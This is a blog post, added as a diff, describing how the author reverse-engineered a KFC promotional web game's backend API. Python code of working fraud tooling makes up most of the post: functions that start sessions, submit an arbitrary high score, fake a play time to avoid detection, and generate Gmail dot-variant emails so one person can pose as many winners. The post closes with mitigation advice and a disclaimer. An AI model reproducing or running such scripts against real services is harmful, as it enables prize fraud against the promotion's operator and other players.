@@ -1,0 +1,174 @@
+---
+title: 'Reversing KFC for free chicken wings'
+description: 'How I managed to get free chicken wings from KFC by reversing their web game'
+date: '2024-10-23'
+---
+
+KFC launched a web-based game where players could potentially win free food (chicken wings, fries, burgers). The game was simple: play, score points, rank in the top 500 players and win everyday. In these games, there's always a way to exploit them. Usually their security practices are good enough so the best that can be done is using Selenium to automate the game. In this case however, there was little to no security and I was able to easily reverse engineer the game.
+
+## How?
+
+The first step was to understand how the game communicated with it's backend. Inspecting the network, I observed the requests made during gameplay. This revealed a series of API calls to `https://api.sun.boomio.eu/webshop-proxy-service/api/handle`.
+
+### Key Findings
+
+1. **User Sessions**: Each game instance used a unique `user_session` ID, generated as a UUID on the frontend.
+2. **API Requests**: The game made four main API requests during a session:
+   - Initializing the game (setting the user session)
+   - Submitting user information (email, name)
+   - Starting a round
+   - Finishing a round and submitting the score
+
+## The Automation Process
+
+With this knowledge, I created a quick Python script to automate the game process. Here's a breakdown of the key components:
+
+### Initializing the Game
+
+The first API request initializes the game session:
+
+```python
+def initialize_game():
+    user_session = str(uuid.uuid4())
+    body = {
+        "user_session": user_session,
+        "current_page_url": current_page_url
+    }
+    response = requests.post(url, json=body, headers=headers, timeout=10)
+    return user_session, response.json().get('campaign_id')
+```
+
+Here we generate our user session and make the first request which in the backend enables our user session. In response we get the campaign_id, which is simply a way for the game backend to identify which game we are playing, I noticed that it changes daily, indicating that the game is reset every day.
+
+### Submitting User Information
+
+The second API request submits the user's information:
+
+```python
+def submit_user_info(user_session, campaign_id, email):
+    body = {
+        "user_session": user_session,
+        "current_page_url": current_page_url,
+        "extra_data": {
+            "ev_type": "user_info",
+            "signal_code": "",
+            "emails_consent": False,
+            "user_email": email,
+            "user_name": username,
+            "m": {"campaign_id": campaign_id}
+        }
+    }
+    return requests.post(url, json=body, headers=headers, timeout=10)
+```
+
+Here we set the user's email and name, and make the second request which in the backend sets this info. In the end I will explain how I automated usernames and emails.
+
+### Starting the Game Round
+
+The third API request signals the start of a game round:
+
+```python
+def start_round(user_session, campaign_id):
+    body = {
+        "user_session": user_session,
+        "current_page_url": current_page_url,
+        "extra_data": {
+            "ev_type": "signal",
+            "signal_code": "ROUND_STARTED",
+            "m": {"campaign_id": campaign_id}
+        }
+    }
+    return requests.post(url, json=body, headers=headers, timeout=10)
+```
+
+### Finishing the Game and Submitting Score
+
+The final API request submits the game score:
+
+```python
+def finish_round(user_session, campaign_id, score):
+    body = {
+        "user_session": user_session,
+        "current_page_url": current_page_url,
+        "extra_data": {
+            "ev_type": "signal",
+            "signal_code": "ROUND_FINISHED",
+            "score": score,
+            "m": {"campaign_id": campaign_id}
+        }
+    }
+    return requests.post(url, json=body, headers=headers, timeout=10)
+```
+
+Here we set the score as high as we want and make the final request which in the backend sets this score and confirms our position in the leaderboard.
+
+### Simulating Gameplay
+
+To make the automation more realistic, we simulate gameplay duration:
+
+```python
+def calculate_gameplay_time(score):
+    min_score, max_score = 340, 32304
+    min_time, max_time = 10, 240
+    normalized_score = (score - min_score) / (max_score - min_score)
+    return min_time + normalized_score * (max_time - min_time)
+
+def simulate_gameplay():
+    score = random.randint(340, 32304)
+    gameplay_duration = calculate_gameplay_time(score)
+    time.sleep(gameplay_duration)
+    return score, gameplay_duration
+```
+
+I do not know for a fact that they do any server side validation, but to be safe I added a random sleep time that is correlated to the score.
+
+## Everything put together
+
+All that's left is to put it all together and automate the process.
+
+### Email Variation Generation
+
+First, we generate email variations using the dot trick:
+
+```python
+def generate_email_variations(email):
+    username, domain = email.split('@')
+    variations = []
+    for r in range(1, len(username)):
+        for combo in itertools.combinations(range(1, len(username)), r):
+            variant = list(username)
+            for i in combo:
+                variant.insert(i, '.')
+            variations.append(f"{''.join(variant)}@{domain}")
+    return variations
+
+email_variations = generate_email_variations("testing@gmail.com")
+total_variations = len(email_variations)
+```
+Since the game identified each unique user by their email, I needed to generate a unique email for each user.
+
+For emails I used the *dot* trick. Say that my base email is `testing@gmail.com`, I can then simply put a dot anywhere in the email and it will be seen as a different email. So `test.ing@gmail.com` is a valid and unique email in their system, but when they send the prize, it will still be redirected to my base email. For example, the email `testing@gmail.com` has a total of 64 variations, meaning I could submit 64 different game scores.
+
+Usernames are not as important, so I used a simple py package to generate them.
+
+To automate it even more, I used concurrency to be able to submit scores for multiple users at the same time.
+
+## Preventing Such Exploits
+
+This exercise highlights serious security considerations for developers. Here are some measures that could be implemented to prevent such exploits:
+
+1. **Server-Side Validation**: Implement server-side checks to validate gameplay data, including score ranges, gameplay duration, and frequency of submissions.
+
+2. **Rate Limiting**: Apply strict rate limits on API calls to prevent rapid-fire submissions from a single IP or user.
+
+3. **User Authentication**: Implement a more secure user authentication system, possibly requiring phone number verification or social media account linking.
+
+4. **Email Verification**: Require email verification before allowing gameplay or prize claims.
+
+6. **Anti-Bot Measures**: Implement CAPTCHA or other anti-bot measures to prevent automated gameplay.
+
+9. **Secure Session Management**: Use more robust session management techniques that are harder to spoof or replicate.
+
+## Ethical Disclaimer
+
+It's crucial to note that this project was undertaken purely as an academic exercise in understanding API structures and game mechanics. Actually using such a script to claim prizes would be unethical and potentially illegal. Always respect the terms of service for any online promotion or game. *I did not actually use this in production or claim any prizes, this is purely speculative and for educational purposes.*
